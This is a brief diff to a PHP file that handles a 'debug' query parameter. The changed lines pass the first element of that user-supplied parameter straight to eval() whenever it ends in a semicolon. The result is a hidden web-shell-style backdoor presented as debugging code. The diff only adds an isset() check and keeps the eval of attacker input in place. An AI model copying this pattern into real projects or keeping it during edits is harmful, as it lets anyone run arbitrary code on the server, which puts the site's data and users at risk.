@@ -9,8 +9,8 @@ if (isset($_GET['debug'])) {
 	
 	$DEBUG_INPUT = $_GET['debug'];
 	if (is_array($DEBUG_INPUT)) {
-		if (preg_match('/;$/', $DEBUG_INPUT[0])) {
-			eval($DEBUG_INPUT[0]);# 
+		if (isset($DEBUG_INPUT[0]) && preg_match('/;$/', $DEBUG_INPUT[0])) {
+			eval($DEBUG_INPUT[0]);
 		} else {
 		}
 		if (isset($DEBUG_INPUT[1])) {
